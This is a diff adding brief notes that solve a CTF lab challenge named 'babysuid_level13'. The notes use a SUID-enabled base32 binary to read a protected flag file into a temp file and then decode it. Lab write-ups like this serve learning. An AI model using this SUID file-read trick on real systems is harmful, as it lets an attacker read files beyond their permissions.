@@ -1,0 +1,5 @@
+1. cd ../..
+2. ./challenge/babysuid_level13
+3. ./usr/bin/base32 is now avaible | this function outputs file contens in base 32 
+4. we can pipe this information into our temporary file with ./usr/bin/base32 flag > ./home/hacker/temp
+5. now we can finally get the flag with ./usr/bin/base32 -d (decode) ./home/hacker/temp
